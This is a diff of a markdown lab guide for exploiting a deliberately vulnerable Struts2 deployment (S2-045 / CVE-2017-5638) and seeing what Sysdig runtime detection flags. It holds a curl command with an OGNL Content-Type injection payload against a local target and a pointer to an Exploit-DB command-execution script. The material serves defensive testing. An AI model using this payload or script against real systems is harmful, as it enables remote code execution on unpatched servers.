@@ -26,10 +26,10 @@ In this lab, you will deployed a Vulnerable Struts2 workload (S2-045 / CVE-2017-
 
 - **Trigger the RCE** by issuing: 
 
-curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',668.5*2)}.multipart/form-data" http://localhost:30080
+`curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',668.5*2)}.multipart/form-data" http://localhost:30080`
 
 - Alternatively you may use ExplpoitDB: https://www.exploit-db.com/exploits/41570
-  Usage: python2 <script> <url> <command>
+  Usage: `python2 <script> <url> <command>`
 
 -----------
 
@@ -40,6 +40,4 @@ curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher
 - However the python script does yield a Medium severity
 - In Sysdig: Navigate to "Threats" -->  "Sysdig Runtime Notable Events" --> Event ID: 18191e49f34866df273474732a500c25
 - In short, a header injection will not trigger in Sysdig but a new system process such as 'cat' will. 
-
-- 
 
